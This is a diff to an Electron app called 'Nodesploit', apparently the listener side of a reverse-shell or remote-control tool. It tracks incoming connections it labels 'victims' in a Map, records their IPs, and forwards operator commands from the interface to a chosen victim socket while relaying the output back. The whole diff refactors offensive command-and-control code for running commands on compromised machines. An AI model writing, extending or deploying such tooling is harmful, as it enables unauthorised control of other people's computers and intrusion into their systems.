@@ -4,9 +4,6 @@ import { mainWindow, loadingWindow } from "./window";
 import { nanoid } from "nanoid";
 
 import store from "@/store";
-import { StringDecoder } from "string_decoder";
-import { TextDecoder } from "util";
-
 /**
  * Set `__static` path to static files in production
  * https://simulatedgreg.gitbooks.io/electron-vue/content/en/using-static-assets.html
@@ -22,7 +19,7 @@ class Nodesploit {
     this.mainWin = null;
     this.loadWin = null;
     this.server = null;
-    this.sockets = [];
+    this.sockets = new Map();
   }
 
   init() {
@@ -69,23 +66,26 @@ class Nodesploit {
     });
 
     this.server.on("listening", () => {
-      var notif = new Notification({
-        title: "Server is ON",
-        body: `Le serveur ecoute sur le port ${
-          this.server.address().port
-        } et l'adresse ${this.server.address().address}`,
-      });
+      if (store.getters.notification) {
+        var notif = new Notification({
+          title: "Server is ON",
+          body: `Le serveur ecoute sur le port ${
+            this.server.address().port
+          } et l'adresse ${this.server.address().address}`,
+        });
 
-      notif.show();
+        notif.show();
+      }
     });
 
     this.server.on("close", () => {
-      var notif = new Notification({
-        title: "Server closed",
-        body: "Le serveur n'ecoute plus sur le port",
-      });
-
-      notif.show();
+      if (store.getters.notification) {
+        var notif = new Notification({
+          title: "Server closed",
+          body: "Le serveur n'ecoute plus sur le port",
+        });
+        notif.show();
+      }
       this.mainWin.webContents.send("closeConnection");
     });
 
@@ -100,22 +100,26 @@ class Nodesploit {
     });
 
     this.server.on("connection", (socket) => {
-      socket.setDefaultEncoding('utf8')
-      socket.setEncoding('utf8')
-      this.sockets.push(socket);
+     
+      // this.sockets.push(socket)
+      socket.setDefaultEncoding("ascii");
       socket.id = nanoid(10);
+      this.sockets.set(socket.id,socket)
+      store.dispatch("ADD_CHILD", { id: socket.id, ip: socket.remoteAddress});
       console.log(`[💀] New Victime: ${socket.id}`);
-      var notif = new Notification({
-        title: "Nouvelles connexion !",
-        body: `une nouvelles connexion entrant ${socket.remoteAddress}`,
-      });
 
-      this.mainWin.webContents.send("newConnection", {
-        id: socket.id,
-        ip: socket.remoteAddress,
-      });
+      if (store.getters.notification) {
+        var notif = new Notification({
+          title: "Nouvelles connexion !",
+          body: `une nouvelles connexion entrant ${socket.remoteAddress}`,
+        });
+        notif.show();
+      }
 
-      notif.show();
+      // this.mainWin.webContents.send("newConnection", {
+      //   id: socket.id,
+      //   ip: socket.remoteAddress,
+      // });
 
       // Socket is fully quitted
 
@@ -133,17 +137,17 @@ class Nodesploit {
       socket.on("end", () => {
         this.mainWin.webContents.send("slaveQuitted", socket.id);
       });
+
       var cmd = "";
       ipcMain.on("cmd", (event, res) => {
-        cmd = res.trim() + "\n";
-        socket.write(res.trim() + "\n");
+        cmd = res.msg.trim() + "\n";
+        this.sockets.get(res.id).write(res.msg.trim() + "\n");
       });
 
       socket.on("data", (data) => {
-        console.log(data.toString('utf8'))
         if (cmd !== data) {
-          this.mainWin.webContents.send("datarec", data.toString('utf8'));
-         }
+          this.mainWin.webContents.send("datarec", data.toString("ascii"));
+        }
       });
     });
 
